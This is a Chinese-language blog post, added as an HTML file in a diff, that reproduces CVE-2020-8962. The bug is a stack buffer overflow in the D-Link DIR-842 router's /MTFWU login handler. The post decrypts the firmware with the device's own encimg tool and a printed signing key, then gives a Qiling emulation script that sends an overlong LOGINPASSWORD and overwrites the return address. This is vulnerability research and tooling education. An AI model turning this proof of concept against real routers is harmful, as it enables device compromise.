@@ -1,0 +1,670 @@
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Jhe&#39;s blog - How to reproduce CVE-2020-8962 with Qiling Framework </title>
+    
+    
+    <meta content="Qiling, CVE, D-Link, security" name="keywords">
+    
+    <meta content="Jhe&#39;s blog - 進行著每天例行的快速新聞瀏覽，偶然看見 CVE-2020-8962 是一個跟 D-Link 有關的漏洞，自從開始貢獻 Qiling Framework 開始就沒少碰過 D-Link 了，於似乎就想重現一下漏洞。
+下載最接近文章中所提及的版本後發現 binwalk 不認得，猜測是韌體被加密了，剛好之前做過一些韌體加解密的筆記，這邊就嘗試看看。
+Firmware decryption 韌體加解密有很多種情境詳細的就不多說了，這篇解釋得很清楚，這邊簡單的總結一下
+   情況 出廠版本 中間版本 最新版本 備註     一 加密0 加密0 加密0 從出廠開始就一直是加密的狀態，且未換過加解密演算法   二 加密0 未加密 加密1 出廠就加密了但廠商突然想要更換加解密演算法   三 未加密 加密0 加密0 出廠時未加密，之後基於某種原因釋出了有加密的版本    由上表可知，第一種情況是最棘手的，但要如何確定除了DIR-842的情況呢? 撇除買一台新機器的選項，由官網提供的韌體下載可以發現DIR-842最舊的版本是沒加密的，看來是中間某一個版本突然加密了，也就是說我們在情況三
+既然是情況三那就好辦了，必定存在一個中間版本是未加密且具有加解密演算法的，除了可以一個一個下載韌體使用 binwalk 暴力測試外，還可以透過 release note 來縮小範圍
+下圖是 DIR-842 RevC 3.13 版的 release note
+裡面提到若要升級到 3.13 版需要先安裝過度版本 v3.092b03_middle
+這裡就得到了關鍵版本的線索，這個過渡版本應該就是未加密且具有加解密演算法的韌體版本" name="description">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    
+
+    
+
+    
+
+    
+
+    <link rel="stylesheet" href="/layui/css/layui.css">
+    <link rel="stylesheet" href="/self/css/default.css">
+    <script src="/layui/layui.js"></script>
+
+    <link rel="stylesheet" async href="/self/css/markdown.min.css">
+    <link rel="stylesheet" async href="/self/css/gallery.css">
+    
+    
+    
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous">
+    <script async src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.0/lazysizes.min.js" integrity="sha256-h2tMEmhemR2IN4wbbdNjj9LaDIjzwk2hralQwfJmBOE=" crossorigin="anonymous"></script></head>
+
+<body>
+    
+    <header class="layui-header layui-bg-cyan">
+
+    
+    
+    <a class="nav-self-logo" href="/">
+        Jhe&#39;s blog
+    </a>
+
+    <ul class="layui-nav layui-layout-right layui-bg-cyan" lay-filter="">
+        
+        
+        <li class="layui-nav-item" id="nav_big"><a href="/post/">Posts</a></li>
+        
+
+        
+
+        
+        <li class="layui-nav-item" id="nav_small">
+            <a href="javascript:;">
+                <i class="layui-icon layui-icon-app" style="font-size: 24px;"></i>
+            </a>
+
+            <dl class="layui-nav-child">
+                
+                <dd><a href="/post/">Posts</a></dd>
+                
+
+                
+            </dl>
+        </li>
+    </ul>
+</header>
+
+<script>
+layui.use('element', function(){
+  var element = layui.element;
+});
+</script>
+        <div id="content" style="min-height:80%">
+<div class="layui-container" style="margin-bottom: 10px">
+    
+
+    <div class="layui-row layui-col-space10">
+        <div class="layui-col-md8 layui-col-sm12 layui-col-xs12">
+            <div class="layui-card single-card">
+                <br />
+                <blockquote class="self-elem-quote  markdown-body single-title" >
+                    <h1>How to reproduce CVE-2020-8962 with Qiling Framework</h1>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2020-07-30</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/qiling/">
+            <span class="layui-badge " style="vertical-align: 2px;">Qiling</span>
+        </a>
+    
+        <a href="/tags/cve/">
+            <span class="layui-badge " style="vertical-align: 2px;">CVE</span>
+        </a>
+    
+        <a href="/tags/d-link/">
+            <span class="layui-badge " style="vertical-align: 2px;">D-Link</span>
+        </a>
+    
+    
+</h3>
+                </blockquote>
+                <div class="layui-card-body markdown-body single-content">
+                    <p>進行著每天例行的快速新聞瀏覽，偶然看見 <code>CVE-2020-8962</code> 是一個跟 D-Link 有關的漏洞，自從開始貢獻 Qiling Framework 開始就沒少碰過 D-Link 了，於似乎就想重現一下漏洞。</p>
+<p>下載最接近<a href="https://ctrsec.io/index.php/2020/02/12/cve-2020-8962-d-link-dir-842-stack-based-buffer-overflow/">文章</a>中所提及的版本後發現 <code>binwalk</code> 不認得，猜測是韌體被加密了，剛好之前做過一些韌體加解密的筆記，這邊就嘗試看看。</p>
+<h3 id="firmware-decryption">Firmware decryption</h3>
+<p>韌體加解密有很多種情境詳細的就不多說了，<a href="https://wzt.ac.cn/2019/09/18/D-Link_BUG/">這篇</a>解釋得很清楚，這邊簡單的總結一下</p>
+<table>
+<thead>
+<tr>
+<th>情況</th>
+<th>出廠版本</th>
+<th>中間版本</th>
+<th>最新版本</th>
+<th>備註</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>一</td>
+<td>加密0</td>
+<td>加密0</td>
+<td>加密0</td>
+<td>從出廠開始就一直是加密的狀態，且未換過加解密演算法</td>
+</tr>
+<tr>
+<td>二</td>
+<td>加密0</td>
+<td>未加密</td>
+<td>加密1</td>
+<td>出廠就加密了但廠商突然想要更換加解密演算法</td>
+</tr>
+<tr>
+<td>三</td>
+<td>未加密</td>
+<td>加密0</td>
+<td>加密0</td>
+<td>出廠時未加密，之後基於某種原因釋出了有加密的版本</td>
+</tr>
+</tbody>
+</table>
+<p>由上表可知，第一種情況是最棘手的，但要如何確定除了<code>DIR-842</code>的情況呢?
+撇除買一台新機器的選項，由官網提供的韌體下載可以發現<code>DIR-842</code>最舊的版本是沒加密的，看來是中間某一個版本突然加密了，也就是說我們在情況三</p>
+<p>既然是情況三那就好辦了，必定存在一個中間版本是未加密且具有加解密演算法的，除了可以一個一個下載韌體使用 <code>binwalk</code> 暴力測試外，還可以透過 <code>release note</code> 來縮小範圍</p>
+<p>下圖是 <code>DIR-842 RevC 3.13</code> 版的 <code>release note</code></p>
+<p><img src="/images/CVE_2020_8962/0.png" alt=""></p>
+<p>裡面提到若要升級到 3.13 版需要先安裝過度版本 <code>v3.092b03_middle</code></p>
+<p>這裡就得到了關鍵版本的線索，這個過渡版本應該就是未加密且具有加解密演算法的韌體版本</p>
+<p>由官網下載 <code>DIR-842 C1 FW v3.02_middle</code> 後要怎麼找到加解密演算的的所在呢?</p>
+<ol>
+<li>
+<p>可以嘗試 <code>grep</code> 幾個關鍵字 <code>encode, decode, encrypt, decrypt, openssl, fwupdate, update</code></p>
+</li>
+<li>
+<p>一般常見的 SOHO Router 都有韌體更新頁面，所以往網頁檔案的方向找也可以縮減範圍</p>
+</li>
+<li>
+<p>從網頁伺服器的 binary 中找到相關線索</p>
+</li>
+</ol>
+<p>在這個例子中最後定位到下方程式碼</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">// --- snip ---
+</span><span style="color:#75715e">// fw encimg 
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">setattr</span>(<span style="color:#e6db74">&#34;/runtime/tmpdevdata/image_sign&#34;</span> ,<span style="color:#e6db74">&#34;get&#34;</span>,<span style="color:#e6db74">&#34;cat /etc/config/image_sign&#34;</span>);
+$image_sign <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;/runtime/tmpdevdata/image_sign&#34;</span>);
+                              
+<span style="color:#a6e22e">setattr</span>(<span style="color:#e6db74">&#34;/runtime/tmpdevdata/encimg&#34;</span> ,<span style="color:#e6db74">&#34;get&#34;</span>,<span style="color:#e6db74">&#34;encimg -d -i &#34;</span><span style="color:#f92672">.</span>$fw_path<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; -s &#34;</span><span style="color:#f92672">.</span>$image_sign<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt; /dev/console </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+<span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;/runtime/tmpdevdata/encimg&#34;</span>);                                                
+      
+<span style="color:#a6e22e">setattr</span>(<span style="color:#e6db74">&#34;/runtime/chfw&#34;</span>,  <span style="color:#e6db74">&#34;get&#34;</span>, <span style="color:#e6db74">&#34;fwupdater -v &#34;</span><span style="color:#f92672">.</span>$fw_path<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;; echo $?&#34;</span>);
+<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;/runtime/chfw&#34;</span>);
+<span style="color:#75715e">// --- snip --
+</span></code></pre></div><p>第 6 行可以看到 <code>encimg</code> 這個指令負責解密或是解碼韌體檔案，<code>fw_path</code> 應該是韌體檔案路徑，<code>image_sign</code> 則為某種密鑰，順帶一提 <code>image_sign</code> 常常被 D-Link 系列拿來當作預設Telnet的密碼</p>
+<p>同樣的方式找到了 <code>encimg</code> 位於 <code>/usr/sbin/encimg</code> 之後 Qiling 就派上用場了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> qiling <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+ql <span style="color:#f92672">=</span> Qiling([<span style="color:#e6db74">&#34;squashfs-root/usr/sbin/encimg&#34;</span>], <span style="color:#e6db74">&#34;squashfs-root&#34;</span>, console<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+ql<span style="color:#f92672">.</span>run()
+</code></pre></div><p>簡單的三行程式碼將 <code>encimg</code> 跑起來看看，結果如下</p>
+<p><img src="/images/CVE_2020_8962/1.png" alt=""></p>
+<p>可以看到出現 <code>no signature specified!</code> 的錯誤訊息之外，還有詳細的參數解釋跟剛剛的程式碼兩相對照，與一開始的猜測所差無幾</p>
+<p>到了這裡基本上解密已經不是問題了，將加密過的韌體放到 <code>squashfs-root</code> 中，並稍微改一下 python script 就可以了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> qiling <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+ql <span style="color:#f92672">=</span> Qiling([<span style="color:#e6db74">&#34;squashfs-root/usr/sbin/encimg&#34;</span>, <span style="color:#e6db74">&#34;-d&#34;</span>,
+            <span style="color:#e6db74">&#34;-i&#34;</span>, <span style="color:#e6db74">&#34;DIR842C1_FW313WWb05.bin&#34;</span>,
+            <span style="color:#e6db74">&#34;-s&#34;</span>, <span style="color:#e6db74">&#34;wrgac65_dlink.2015_dir842&#34;</span>], <span style="color:#e6db74">&#34;squashfs-root&#34;</span>, console<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+ql<span style="color:#f92672">.</span>run()
+</code></pre></div><p>下圖為執行前後對比，可以明顯看到原本什麼都不認得的 <code>binwalk</code> 在解密腳本執行完後，就可以正常辨識了</p>
+<p><img src="/images/CVE_2020_8962/2.png" alt=""></p>
+<h3 id="reproduce-the-bug-with-qiling-framework">Reproduce the bug with Qiling Framework</h3>
+<p>根據分析文表示在 <code>/MTFWU</code> 這個路徑有 stack-based buffer overflow，詳細位置可以看原文分析，下面貼出我自己整理過的截圖</p>
+<p><img src="/images/CVE_2020_8962/3.png" alt=""></p>
+<p>在 50 行處的 <code>strcpy</code> 直接將 <code>LOGINPASSWORD</code> 塞進堆疊裡並且沒有檢查長度，但是為了要走到這個路徑，還是需要分析一下前面幾個 function 像是 <code>session_check</code>, <code>read_sessions</code> 等等</p>
+<p>這裡 Qiling 就可以大顯神威了，一般來說不管是用 <a href="https://github.com/firmadyne/firmadyne">firmadyne</a> 或是 QEMU User-mode 都會面臨一些問題諸如: nvram 讀不到特定資料、特定檔案不存在、記憶體中某些資料不如預期之類雜七雜八的問題</p>
+<p>這些都可能導致程式走不到我們預期的路徑，但 Qiling 是由 python 組成的，其最大特點就是高可互動性，基本上執行韌體分析就跟 coding &amp; debug 沒兩樣，無論是下斷點或是存取記憶體資料絲毫不差</p>
+<p>舉個例子，在<code>session_check</code> 中用到<code>read_sessions</code> 用來逐一讀取 <code>/var/sessions</code> 下的檔案，<code>is_valid</code> 則用來檢查該 session 是否有效，是否有效的依據也很簡單，就是呼叫 syscall sysinfo 然後比較一下 session 中的時間大小與 uptime 誰大，這裡就需要 hook syscall sysinfo 來控制 uptime 以通過檢查</p>
+<p><img src="/images/CVE_2020_8962/4.png" alt=""></p>
+<p>通過 <code>man 2 sysinfo</code> 可以知道 <code>struct sysinfo</code> 是 64 bytes 而 uptime 就是前 4 bytes，跟逆向結果一致</p>
+<p><img src="/images/CVE_2020_8962/5.png" alt=""></p>
+<p><img src="/images/CVE_2020_8962/6.png" alt=""></p>
+<p>於此，我們需要加入 hook sysinfo function 的相關程式碼, 並使用 <code>python3 -c 'print(&quot;AAAA\x00&quot;+&quot;A&quot;*0xbf)' &gt; /var/session/c1</code> 建立 <code>/var/session/c1</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">my_syscall_sysinfo</span>(ql, sysinfo_info, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+    ql<span style="color:#f92672">.</span>mem<span style="color:#f92672">.</span>write(sysinfo_info, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span>) <span style="color:#75715e"># uptime</span>
+    regreturn <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    ql<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;sysinfo(0x</span><span style="color:#e6db74">{</span>sysinfo_info<span style="color:#e6db74">:</span><span style="color:#e6db74">02x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">) = </span><span style="color:#e6db74">{</span>regreturn<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+    <span style="color:#66d9ef">return</span> regreturn
+</code></pre></div><p>再來，因為程式使用 <code>getenv</code> 來取得封包相關的訊息，也需要將對應的字串放入環境變數中，還好 Qiling 可以很輕易地做到這件事情</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">envs <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span>: <span style="color:#e6db74">&#34;POST&#34;</span>,
+        <span style="color:#e6db74">&#34;REQUEST_URI&#34;</span>: <span style="color:#e6db74">&#34;/MTFWU&#34;</span>,
+        <span style="color:#e6db74">&#34;CONTENT_TYPE&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>,
+        <span style="color:#e6db74">&#34;HTTP_MTFWU_ACT&#34;</span>: <span style="color:#e6db74">&#34;Login&#34;</span>,
+        <span style="color:#e6db74">&#34;HTTP_COOKIE&#34;</span>: <span style="color:#e6db74">&#34;uid=AAAA&#34;</span>,
+        }
+</code></pre></div><p>同時，我們也追求整個模擬過程可以自動化進行無須人工介入，所以我們將 stdin 直接替換成一個 python object，讓我們可以在模擬程式需要 input 的時候，幫我們代勞</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Fake_stdin</span>():
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read</span>(self, size, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+        <span style="color:#75715e"># return payload for reading from stdin</span>
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ACTION=login&amp;LOGINPASSWORD=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x248</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fileno</span>(self, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+        <span style="color:#75715e"># return file descriptor</span>
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+</code></pre></div><p>最後，我們當然希望程式不要直接死去，最好是可以停留在 return 之前，讓我們可以觀察暫存器或是記憶體中的資料，這當然對 Qiling 來說跟喝水一樣簡單</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
+<span style="color:#75715e"># dump all registers</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_reg</span>(ql, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+    <span style="color:#66d9ef">for</span> idx, val <span style="color:#f92672">in</span> ql<span style="color:#f92672">.</span>reg<span style="color:#f92672">.</span>save()<span style="color:#f92672">.</span>items():
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> isinstance(idx, int):
+            print(idx, <span style="color:#e6db74">&#34;:&#34;</span>, hex(val))
+            
+    breakpoint()
+
+ql<span style="color:#f92672">.</span>hook_address(dump_reg, <span style="color:#ae81ff">0x41d3f0</span>) <span style="color:#75715e"># breakpoint before return</span>
+</code></pre></div><p>將上面所提到的功能全部彙整到一起，就是一個可以引發 crash 的 python script 了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> qiling <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#75715e"># hook function for syscall sysinfo</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">my_syscall_sysinfo</span>(ql, sysinfo_info, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+    ql<span style="color:#f92672">.</span>mem<span style="color:#f92672">.</span>write(sysinfo_info, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span>) <span style="color:#75715e"># uptime</span>
+    regreturn <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    ql<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;sysinfo(0x</span><span style="color:#e6db74">{</span>sysinfo_info<span style="color:#e6db74">:</span><span style="color:#e6db74">02x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">) = </span><span style="color:#e6db74">{</span>regreturn<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+    <span style="color:#66d9ef">return</span> regreturn
+
+<span style="color:#75715e"># dump all registers</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_reg</span>(ql, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+    ql<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;=&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; register dump &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;=&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>)
+    <span style="color:#66d9ef">for</span> idx, val <span style="color:#f92672">in</span> ql<span style="color:#f92672">.</span>reg<span style="color:#f92672">.</span>save()<span style="color:#f92672">.</span>items():
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> isinstance(idx, int):
+            ql<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>hex(val)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+            
+    breakpoint()
+
+<span style="color:#75715e"># fake stdin for sending payload</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Fake_stdin</span>:
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read</span>(self, size, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ACTION=login&amp;LOGINPASSWORD=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x248</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fileno</span>(self, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+
+    envs <span style="color:#f92672">=</span> {
+            <span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span>: <span style="color:#e6db74">&#34;POST&#34;</span>,
+            <span style="color:#e6db74">&#34;REQUEST_URI&#34;</span>: <span style="color:#e6db74">&#34;/MTFWU&#34;</span>,
+            <span style="color:#e6db74">&#34;CONTENT_TYPE&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>,
+            <span style="color:#e6db74">&#34;HTTP_MTFWU_ACT&#34;</span>: <span style="color:#e6db74">&#34;Login&#34;</span>,
+            <span style="color:#e6db74">&#34;HTTP_COOKIE&#34;</span>: <span style="color:#e6db74">&#34;uid=AAAA&#34;</span>,
+            <span style="color:#e6db74">&#34;CONTENT_LENGTH&#34;</span>: str(<span style="color:#ae81ff">27</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x248</span>), 
+            }
+
+    ql <span style="color:#f92672">=</span> Qiling([<span style="color:#e6db74">&#34;squashfs-root/usr/sbin/mtfwu&#34;</span>], <span style="color:#e6db74">&#34;squashfs-root&#34;</span>, 
+                output<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;default&#34;</span>,
+                env<span style="color:#f92672">=</span>envs,           <span style="color:#75715e"># setting environment variables </span>
+                stdin<span style="color:#f92672">=</span>Fake_stdin()) <span style="color:#75715e"># hijack stdin with Fake_stdin</span>
+                
+    ql<span style="color:#f92672">.</span>set_syscall(<span style="color:#e6db74">&#34;sysinfo&#34;</span>, my_syscall_sysinfo)  <span style="color:#75715e"># syscall hook for sysinfo</span>
+    ql<span style="color:#f92672">.</span>set_syscall(<span style="color:#e6db74">&#34;_newselect&#34;</span>, <span style="color:#66d9ef">lambda</span> <span style="color:#f92672">*</span>_: <span style="color:#66d9ef">None</span>)  <span style="color:#75715e"># hook syscall _newselect with anonymous NOP function to avoid manual input requirement</span>
+    ql<span style="color:#f92672">.</span>hook_address(dump_reg, <span style="color:#ae81ff">0x41d3f0</span>)            <span style="color:#75715e"># breakpoint before return and dump all registers</span>
+
+    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;squashfs-root/var/session/c1&#34;</span>, <span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> fh: <span style="color:#75715e"># setup propper session file</span>
+        fh<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0xbf</span>)                   <span style="color:#75715e"># first four bytes were the UID in cookie</span>
+
+    ql<span style="color:#f92672">.</span>run()
+</code></pre></div><p>備註: 因為程式有使用到 <code>select</code> 等待 stdin 輸入，所以用一個空匿名函數取代掉 <code>ql_syscall__newselect</code>，讓 script 可以直接由 <code>Fake_stdin</code> 讀到 input</p>
+<p>整個不到 50 行的 python script 就可以把整個整個程式跑起來，並且斷點在 <code>0x41d3f0</code>，執行之後可以觀察到 <code>$fp($s8)</code> 跟 <code>$ra</code> 兩個暫存器都已經被覆蓋為 <code>AAAA</code> 了</p>
+<p><img src="/images/CVE_2020_8962/7.png" alt=""></p>
+<h3 id="conclusion">Conclusion</h3>
+<p>Qiling Framework 是一個強大的跨平台且支援多架構的二進制分析工具，上面所提到的 feature 還只是冰山一角，他還有更多好用強大的功能，例如可以接上其他 debugger 像是 GDB、IDA Pro、Radare2 等，或是 partial execution 讓 Qiling 得以只執行 binary 裡面其中片段的程式碼，而不需要從頭到尾跑一遍，更多功能可以參考 <a href="https://docs.qiling.io/en/latest/">Qiling Framework Documentation</a> 或是 <a href="https://github.com/qilingframework/qiling">Github</a>，沒有意外的話，未來還會有更多 feature 被加到 Qiling Framework 中，拭目以待。</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://wzt.ac.cn/2019/09/18/D-Link_BUG/">D-Link DIR-878 路由器存在漏洞两枚</a></li>
+<li><a href="https://ctrsec.io/index.php/2020/02/12/cve-2020-8962-d-link-dir-842-stack-based-buffer-overflow/">[CVE-2020-8962] D-LINK DIR-842 Stack-based Buffer-overflow</a></li>
+<li><a href="https://docs.qiling.io/en/latest/">Qiling Framework Documentation</a></li>
+</ul>
+</div>
+            </div>
+        </div>
+
+        <div class="layui-col-md4 layui-col-sm12 layui-col-xs12">
+            
+            <div class="layui-card single-card">
+                <h2 class="single-title">Relevant Topics</h2>
+                
+                	
+                    <div style="margin-left: 10px;">
+                        <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                            <a href="/post/cve_2018_20250/">
+                                <h3 class="">CVE-2018-20250</h3>
+                            </a>
+                            
+                            <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2019-02-27</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/windows/">
+            <span class="layui-badge " style="vertical-align: 2px;">Windows</span>
+        </a>
+    
+        <a href="/tags/winrar/">
+            <span class="layui-badge " style="vertical-align: 2px;">WinRAR</span>
+        </a>
+    
+        <a href="/tags/cve/">
+            <span class="layui-badge " style="vertical-align: 2px;">CVE</span>
+        </a>
+    
+    
+</h3>
+                        </blockquote>
+                    </div>
+                	
+                    <div style="margin-left: 10px;">
+                        <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                            <a href="/post/blueborne/">
+                                <h3 class="">Blueborne</h3>
+                            </a>
+                            
+                            <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2018-11-22</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/cve/">
+            <span class="layui-badge " style="vertical-align: 2px;">CVE</span>
+        </a>
+    
+        <a href="/tags/android/">
+            <span class="layui-badge " style="vertical-align: 2px;">Android</span>
+        </a>
+    
+    
+</h3>
+                        </blockquote>
+                    </div>
+                	
+                    <div style="margin-left: 10px;">
+                        <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                            <a href="/post/cve_2017_11610/">
+                                <h3 class="">CVE-2017-11610</h3>
+                            </a>
+                            
+                            <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2018-09-30</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
